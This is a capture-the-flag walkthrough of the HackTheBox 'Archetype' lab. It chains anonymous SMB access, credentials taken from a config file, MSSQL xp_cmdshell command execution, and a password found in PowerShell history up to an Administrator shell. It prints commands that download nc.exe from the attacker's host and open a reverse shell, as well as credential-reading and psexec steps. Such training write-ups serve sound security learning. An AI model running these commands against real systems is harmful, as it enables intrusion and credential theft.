Archetype

HackTheBox · Very Easy by Brenno M.

Archetype chains SMB enumeration, command execution via MSSQL (xp_cmdshell) and privilege escalation from the PowerShell history. It is the first Starting Point lab with a full chain up to Administrator.

Reconnaissance

Nmap identifies SMB (445) and MSSQL (1433). The backups share is anonymously accessible and contains prod.dtsConfig.

nmap -sC -sV <IP>
smbclient -N -L \\\\<IP>\\
smbclient -N \\\\<IP>\\backups
get prod.dtsConfig

The config file exposes the database connection credentials (user sql_svc).

Foothold - MSSQL

With mssqlclient (Impacket) we connect to MSSQL. The user has the sysadmin role, letting us enable xp_cmdshell and run OS commands.

python3 mssqlclient.py ARCHETYPE/sql_svc@<IP> -windows-auth
SELECT is_srvrolemember('sysadmin');
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell "whoami"

For a stable shell, host nc.exe on a local SMB/HTTP server and trigger a reverse shell as sql_svc.

xp_cmdshell "powershell -c iwr -uri http://<MY_IP>/nc.exe -out C:\\Users\\Public\\nc.exe"
xp_cmdshell "C:\\Users\\Public\\nc.exe -e cmd.exe <MY_IP> 4444"

Privilege escalation

During local enumeration, the PowerShell history reveals the Administrator password in clear text.

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
# net use \\...  ADMINISTRATOR  <PASSWORD>

With the credential (administrator:<PASSWORD>), Impacket's psexec returns an Administrator shell, and the root flag is read on the desktop.

python3 psexec.py administrator@<IP>
type C:\Users\Administrator\Desktop\root.txt
